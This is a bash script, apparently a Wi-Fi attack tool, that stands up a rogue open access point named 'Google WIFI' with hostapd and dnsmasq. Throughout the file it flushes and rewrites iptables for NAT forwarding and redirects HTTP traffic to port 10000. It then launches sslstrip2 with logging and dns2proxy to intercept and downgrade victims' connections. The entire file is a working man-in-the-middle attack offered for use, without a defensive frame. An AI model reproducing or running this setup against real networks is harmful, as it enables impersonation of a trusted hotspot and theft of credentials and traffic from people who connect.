#Colors setting
BLUE='\033[0;36m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YLOW='\033[0;33m'
EC='\033[0m'
bold=$(tput bold)

echo -e "${BLUE} "
echo "         __      __._____________.__     ________________________________  _________  ____  __.                "
echo "        /  \    /  \__\_   _____/|__|   /  _  \__    ___/\__    ___/  _  \ \_   ___ \|    |/ _|                "
echo "        \   \/\/   /  ||    __)  |  |  /  /_\  \|    |     |    | /  /_\  \/    \  \/|      <                  "
echo "         \        /|  ||     \   |  | /    |    \    |     |    |/    |    \     \___|    |  \                 "
echo "          \__/\  / |__|\___  /   |__| \____|__  /____|     |____|\____|__  /\______  /____|__ \                "
echo "               \/          \/                 \/                         \/        \/        \/                "
echo "                                                                                                               "
echo "                                                                                                               "
echo "  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______    ______    ______  "
echo " /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/   /_____/   /_____/  "
echo "                                                                                                               "
echo "                                                                                                               "
echo "___________       __               _____ __________     ________________________________  _________  ____  __. "
echo "\_   _____/____  |  | __ ____     /  _  \\______   \   /  _  \__    ___/\__    ___/  _  \ \_   ___ \|    |/ _| "
echo " |    __) \__  \ |  |/ // __ \   /  /_\  \|     ___/  /  /_\  \|    |     |    | /  /_\  \/    \  \/|      <   "
echo " |     \   / __ \|    <\  ___/  /    |    \    |     /    |    \    |     |    |/    |    \     \___|    |  \  "
echo " \___  /  (____  /__|_ \\___  > \____|__  /____|     \____|__  /____|     |____|\____|__  /\______  /____|__ \ "
echo "     \/        \/     \/    \/          \/                   \/                         \/        \/        \/ "
echo -e " ${EC} "

#Internet connection test.
sudo ping -c1 -W1 -q 8.8.8.8 &>/dev/null
status=$( echo $? )
        if [[ $status == 0 ]] ; then
                echo -e "${GREEN}++ Internet connection ok ++${EC}"
        else
                echo -e "${RED}No Internet connection !${EC}"
				exit 0
        fi

SwitchUP(){
  ifdown $1
  ifup $1
}

SwitchUP wlan0 > /dev/null
SwitchUP wlan1 > /dev/null

#Check int

netstat -i | grep wlan0 > /dev/null 
status=$( echo $? )
        if [[ $status == 0 ]] ; then
                echo -e "${GREEN}wlan0 is UP${EC}"
                IPwlan0=`ip -f inet -o addr show wlan0|cut -d\  -f 7 | cut -d/ -f 1`
                if [ -z "$IPwlan0" ]; then
                echo -e "${YLOW}wlan0 is connected but has no IP -> adding IP ...${EC}"
                SwitchUP wlan0
                IPwlan0=`ip -f inet -o addr show wlan0|cut -d\  -f 7 | cut -d/ -f 1`
                fi
                echo -e "${GREEN}IP of wlan0 : $IPwlan0${EC}"
         else

                echo -e "${RED}wlan0 is DOWN -> please plug wlan0${EC}"
         fi


netstat -i | grep wlan1 > /dev/null 
status=$( echo $? )
        if [[ $status == 0 ]] ; then
                echo -e "${GREEN}wlan1 is UP${EC}"
                IPwlan1=`ip -f inet -o addr show wlan1|cut -d\  -f 7 | cut -d/ -f 1`
                if [ -z "$IPwlan1" ]; then
                echo -e "${YLOW}wlan1 is connected but has no IP -> adding IP ...${EC}"
                SwitchUP wlan1
                IPwlan1=`ip -f inet -o addr show wlan1|cut -d\  -f 7 | cut -d/ -f 1`
                fi
                echo -e "${YLOW}IP of wlan1 : $IPwlan1${EC}"
         else
                echo -e "${RED}wlan1 is DOWN -> please plug wlan1 ...${EC}"
         fi


#WIFI card IP verification
#wlan0 is the card used for the AP network
#wlan1 is the card used for the Internet access


#delete iptables rules
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --table mangle --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables --table mangle --delete-chain

#Set iptables rules 
sudo iptables --table nat --append POSTROUTING --out-interface wlan0 -j SNAT --to-source $IPwlan1
sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT

#enable FORWARDING

sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

pkill hostapd

hostapd /etc/hostapd/hostapd.conf > /dev/null 
status=$( echo $? )
        if [[ $status == 0 ]] ; then
                echo -e "${GREEN}Hostapd works properly !!${EC}"
				sleep 2
        else
                echo -e "${RED}Error when trying to start Hostapd !!!${EC}"
				echo -e "${RED}Unable to perform RogueAP attack${EC}"
				sleep 2
                exit 0
        fi

#hostapd configuration setup
echo -e "${YLOW}Update hostapd configuration file${EC}"
sleep 2
echo -e > /etc/hostapd/hostapd.conf "# Wlan Wi-Fi interface\ninterface=wlan0\n\n# nl80211 use ad drivers for the Linux mac80211\ndriver=nl80211\n\n# SSID\nssid=Google WIFI\n\n
 # Wi-Fi mode (a = IEEE 802.11a, b = IEEE 802.11b, g = IEEE 802.11g)\nhw_mode=g\n\n
 # canal de fréquence Wi-Fi (1-14)\nchannel=6\n\n# Station MAC address -based authentication\n#Please note that this kind of access control requires a driver that uses\n# hostapd to take care of management frame processing and as such, this can be\n#
 used with driver=hostap or driver=nl80211, but not with driver=atheros.\n# 0 = accept unless in deny list\n# 1 = deny unless in accept list\n#2 = use external RADIUS server (accept/deny lists are searched first)\nmacaddr_acl=0\n\n# Open System Authentication\n#auth_algs=0\n\n#
 Send empty SSID in beacons and ignore probe request frames that do not\n# specify full SSID, i.e., require stations to know SSID.\n# default: disabled (0)\nignore_broadcast_ssid=0"

echo -e "${YLOW}Update dnsmasq configuration file${EC}"
sleep 2
echo -e > /etc/dnsmasq.conf "#dnsmasq listening interface\ninterface=wlan0\n\n#Give a range of IP addresses to hand out\n#In the example above, this server would hand out address\n#
starting at 192.168.0.10 and ending at 192.168.0.92.\n#The last number is how long the DHCP leases are good for.\n#
In this example, they would be good for twelve hours.\n\ndhcp-range=192.168.93.10,192.168.93.92,255.255.255.0,12h\n\n#DNS server\n#dhcp-option=6,192.168.93.93\n\n#
Netmask\ndhcp-option=1,255.255.255.0\n\n#Default Gateway\ndhcp-option=3,192.168.93.93\n\n#Log DHCP queries\nlog-dhcp\n"

## clean dnsmasq

pkill dnsmasq > /dev/null 2>&1

#iptable for ssltrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

#iptables captive portal
# sudo iptables -t mangle -N internet
# sudo iptables -t mangle -A PREROUTING -i wlan0 -p tcp -m tcp --dport 80 -j internet
# sudo iptables -t mangle -A internet -j MARK --set-mark 99
# sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $IPwlan0

echo -e "${GREEN}${bold}^^ ^^ ^^ ^^ Starting Fake AP Attack ^^ ^^ ^^ ^^${EC}"
sleep 3
Launch_SSLSTRIP="sudo python /opt/sslstrip2/sslstrip.py -l 10000 -w sslstrip2.log"
Launch_DNS2PROXY="cd /opt/dns2proxy && sudo python /opt/dns2proxy/dns2proxy.py"
Launch_HOSTAPD="sudo hostapd /etc/hostapd/hostapd.conf"
Launch_DNSMASQ="sudo dnsmasq -C /etc/dnsmasq.conf -d"

unset SESSION_MANAGER

$Launch_HOSTAPD &
xterm -hold -e "$Launch_DNSMASQ" &
xterm -hold -e "$Launch_DNS2PROXY" &
xterm -hold -e "$Launch_SSLSTRIP" &



